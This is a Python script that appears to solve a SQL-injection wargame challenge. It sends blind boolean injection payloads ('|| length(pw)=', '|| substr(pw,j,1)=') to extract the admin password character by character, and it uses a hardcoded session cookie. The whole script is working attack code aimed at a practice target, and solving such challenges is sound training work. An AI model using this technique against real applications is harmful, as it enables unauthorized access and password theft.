import requests, time


flag = ''
length= 0
 
session = dict(PHPSESSID="o6eanf2bo08v2saogks4o19526")
 
# find the length of PW 
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || length(pw)="+str(i)+"%23", cookies=session)
    except:
        print("exception")
        continue
    if 'Hello admin' in r.text: #true
        length = i
        break
 
print("[+]  Length of admin pw : " + str(length))
 
for j in range(1, length+1):
    for i in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || substr(pw,"+str(j)+",1) ='"+ str(chr(i)), cookies=session)
        except:
            print("exception")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(i)
            print("[+] finding pw : " + flag)
            break
        time.sleep(0.1)
print("[+] pw of admin : " + flag)